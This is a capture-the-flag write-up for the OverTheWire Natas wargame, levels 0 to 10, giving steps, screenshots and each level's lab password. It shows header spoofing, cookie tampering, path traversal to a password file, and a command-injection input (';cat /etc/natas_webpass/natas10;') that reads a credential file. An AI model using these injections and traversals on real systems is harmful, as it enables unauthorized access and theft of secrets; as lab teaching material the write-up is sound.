# Natas Write-up

https://overthewire.org/wargames/natas

## Level 0

    Username: natas0
    Password: natas0
    URL:      http://natas0.natas.labs.overthewire.org

<img width="1206" height="408" alt="image" src="https://github.com/user-attachments/assets/47f62309-0728-424b-8209-600b3b9fbbaf" />

<img width="1381" height="503" alt="image" src="https://github.com/user-attachments/assets/a1e61ed9-db03-4f46-9083-cba1509801a8" />

The password for natas1 is:

    0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

## Level 1

    Username: natas1
    URL:      http://natas1.natas.labs.overthewire.org

<img width="499" height="299" alt="image" src="https://github.com/user-attachments/assets/a520ca06-d66c-4c0b-84df-1453c641adf1" />

<img width="1453" height="507" alt="image" src="https://github.com/user-attachments/assets/13e8094e-233d-4b11-b320-6c45e00f8959" />

Use `CTRL + U` to view source page! 

<img width="1132" height="366" alt="image" src="https://github.com/user-attachments/assets/7a4fc59e-c311-4ed9-9ca0-80e0552e3408" />

The password for natas2 is:

    TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 

## Level 2

    Username: natas2
    URL:      http://natas2.natas.labs.overthewire.org

<img width="1125" height="355" alt="image" src="https://github.com/user-attachments/assets/fb53fbb2-72ca-42a4-81b1-3e67659ac1cf" />

We can see `/files/` directories 

<img width="1116" height="409" alt="image" src="https://github.com/user-attachments/assets/53fa8479-53b4-4f28-b8c9-0683b8d6c112" />

http://natas2.natas.labs.overthewire.org/files/users.txt

<img width="701" height="216" alt="image" src="https://github.com/user-attachments/assets/85047c88-8df1-4092-944d-a036cb2f850b" />

natas3:

    3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

## Level 3

    Username: natas3
    URL:      http://natas3.natas.labs.overthewire.org

`/robots.txt` page

<img width="703" height="151" alt="image" src="https://github.com/user-attachments/assets/2fee8124-d79e-4909-950c-ba78cc9a6d23" />

`/s3cr3t/` page



`/s3cr3t/user.txt` file

<img width="698" height="145" alt="image" src="https://github.com/user-attachments/assets/057d5b4f-2723-4b39-8f06-fc935947ad97" />

natas4:

    QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

## Level 4

    Username: natas4
    URL:      http://natas4.natas.labs.overthewire.org

<img width="1245" height="299" alt="image" src="https://github.com/user-attachments/assets/320a1640-7fc2-4b63-a95c-7c27294783e9" />

Click `Refresh page` and intercept this request

    GET /index.php HTTP/1.1
    Host: natas4.natas.labs.overthewire.org
    Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://natas4.natas.labs.overthewire.org/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    Connection: keep-alive

Change the Referer from `natas4` to `natas5` and forward the packet

<img width="1488" height="875" alt="image" src="https://github.com/user-attachments/assets/626572b4-ee6e-4782-a024-b5d76b7c4095" />

natas5:

    0n35PkggAPm2zbEpOU802c0x0Msn1ToK

## Level 5

    Username: natas5
    URL:      http://natas5.natas.labs.overthewire.org

<img width="1127" height="361" alt="image" src="https://github.com/user-attachments/assets/8d9afa08-1190-482e-b744-6e7b89551cf3" />

`curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt`

<img width="954" height="517" alt="image" src="https://github.com/user-attachments/assets/468122c8-a880-4903-ac10-571ed364f0fc" />

Change `loggedin 0` to `loggedin 1`

<img width="960" height="133" alt="image" src="https://github.com/user-attachments/assets/01b89689-7e7a-4b1a-a759-750c49f5bf7c" />

`curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b natas5_cookie.txt"`

<img width="954" height="338" alt="image" src="https://github.com/user-attachments/assets/b7ed99df-47c5-417e-bc91-957f20c379d2" />

natas6:

    0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## Level 6 

    Username: natas6
    URL:      http://natas6.natas.labs.overthewire.org

<img width="773" height="251" alt="image" src="https://github.com/user-attachments/assets/3350e2a5-b751-450e-ae01-38780b30ffa9" />

/index-source.html

<img width="1330" height="711" alt="image" src="https://github.com/user-attachments/assets/da68ab2b-c48a-44a6-b279-fd4d7551fe3e" />

/includes/secret.inc

<img width="538" height="73" alt="image" src="https://github.com/user-attachments/assets/cb696851-a0fe-4511-9445-4dd6130d67cd" />

    FOEIUWGHFEEUHOFUOIU

<img width="775" height="246" alt="image" src="https://github.com/user-attachments/assets/89c0a442-faf2-4f3e-b1fa-d1ea51416f52" />

<img width="768" height="289" alt="image" src="https://github.com/user-attachments/assets/c8fbd108-fa0c-4433-a059-44d3edfacde3" />

natas7

    bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Level 7

    Username: natas7
    URL:      http://natas7.natas.labs.overthewire.org

<img width="766" height="211" alt="image" src="https://github.com/user-attachments/assets/677908f0-7779-4483-a1fb-58678529c757" />

/index.php?page=home, /index.php?page=about

<img width="1350" height="493" alt="image" src="https://github.com/user-attachments/assets/f4d4cf99-b38c-48aa-9c67-ab8fb0f4cd2d" />

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

<img width="776" height="221" alt="image" src="https://github.com/user-attachments/assets/bc25c713-0858-4e0d-8d83-325aa1b72cf1" />

natas8:

    xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 

## Level 8

    Username: natas8
    URL:      http://natas8.natas.labs.overthewire.org

<img width="773" height="267" alt="image" src="https://github.com/user-attachments/assets/8990325d-e8e4-43fd-8f18-c203ecb20cb1" />

<img width="630" height="317" alt="image" src="https://github.com/user-attachments/assets/094a7e21-c0f2-4622-b646-7354b57c0c6b" />

    3d3d516343746d4d6d6c315669563362

<img width="1851" height="675" alt="image" src="https://github.com/user-attachments/assets/a3fe316e-9564-499c-ae77-76faf59907aa" />

<img width="1849" height="709" alt="image" src="https://github.com/user-attachments/assets/50d549d1-effd-4276-b90c-b915ade32f86" />

<img width="1855" height="705" alt="image" src="https://github.com/user-attachments/assets/6b1fe6cf-53c1-4081-afd4-f10d46dacd4c" />

    oubWYf2kBq

<img width="770" height="271" alt="image" src="https://github.com/user-attachments/assets/21b7b96f-4703-4573-96ee-4456979dcd14" />

<img width="767" height="285" alt="image" src="https://github.com/user-attachments/assets/3b4c07c7-0756-4cf6-87eb-630f46a1c3fb" />

natas9:

    ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## Level 9

    Username: natas9
    URL:      http://natas9.natas.labs.overthewire.org

<img width="569" height="288" alt="image" src="https://github.com/user-attachments/assets/d00a9dc5-ff54-4d9f-8039-da0e5c17e124" />

<img width="767" height="275" alt="image" src="https://github.com/user-attachments/assets/4baa44bb-bf27-48a9-b343-12db123350c5" />

<img width="766" height="275" alt="image" src="https://github.com/user-attachments/assets/d8f853db-ee34-4588-bf90-3dd4957e8255" />

<img width="766" height="447" alt="image" src="https://github.com/user-attachments/assets/0a6517c7-9f3f-47d7-a63a-eb34a3136eca" />

`;cat /etc/natas_webpass/natas10;`

<img width="764" height="312" alt="image" src="https://github.com/user-attachments/assets/4150f320-41d7-4cf4-ae88-40ecc2d2a471" />

natas10:

    t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

## Level 10

    Username: natas10
    URL:      http://natas10.natas.labs.overthewire.org


